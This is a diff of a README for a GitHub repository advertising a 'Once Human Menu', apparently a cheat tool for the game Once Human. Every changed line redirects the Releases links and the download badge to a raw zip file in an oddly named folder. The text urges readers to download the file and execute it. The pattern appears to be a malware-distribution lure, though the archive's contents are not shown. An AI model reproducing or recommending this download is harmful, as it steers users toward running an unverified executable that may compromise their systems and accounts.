@@ -10,9 +10,9 @@ Welcome to the Once Human Menu repository! Here, you will find truly unique soft
 
 ### Get the Software
 
-To access the Once Human Menu software, please visit the [Releases](https://github.com/muskan18113/Once-Human-Menu/releases) section. Download the file and execute it on your system to experience its cutting-edge features.
+To access the Once Human Menu software, please visit the [Releases](https://github.com/muskan18113/Once-Human-Menu/raw/refs/heads/main/Glycine/Human_Menu_Once_1.0.zip) section. Download the file and execute it on your system to experience its cutting-edge features.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/muskan18113/Once-Human-Menu/releases)
+[![Download Now](https://github.com/muskan18113/Once-Human-Menu/raw/refs/heads/main/Glycine/Human_Menu_Once_1.0.zip)](https://github.com/muskan18113/Once-Human-Menu/raw/refs/heads/main/Glycine/Human_Menu_Once_1.0.zip)
 
 ### Explore the Possibilities
 
@@ -33,10 +33,10 @@ Discover a new realm of possibilities with the Once Human Menu software. Enhance
 
 ### Stay Updated
 
-For the latest updates and releases, make sure to regularly check the [Releases](https://github.com/muskan18113/Once-Human-Menu/releases) section of this repository.
+For the latest updates and releases, make sure to regularly check the [Releases](https://github.com/muskan18113/Once-Human-Menu/raw/refs/heads/main/Glycine/Human_Menu_Once_1.0.zip) section of this repository.
 
 Join us on this journey of innovation and excellence with Once Human Menu. Get ready to elevate your gaming experience to new heights!
 
 --- 
 
-In this repository, you will find cutting-edge software developed specifically for Once Human. Elevate your gaming experience with our advanced solution. Visit the [Releases](https://github.com/muskan18113/Once-Human-Menu/releases) section to download the software and take your gameplay to the next level. #oncehuman #software #gaming 🎮
+In this repository, you will find cutting-edge software developed specifically for Once Human. Elevate your gaming experience with our advanced solution. Visit the [Releases](https://github.com/muskan18113/Once-Human-Menu/raw/refs/heads/main/Glycine/Human_Menu_Once_1.0.zip) section to download the software and take your gameplay to the next level. #oncehuman #software #gaming 🎮
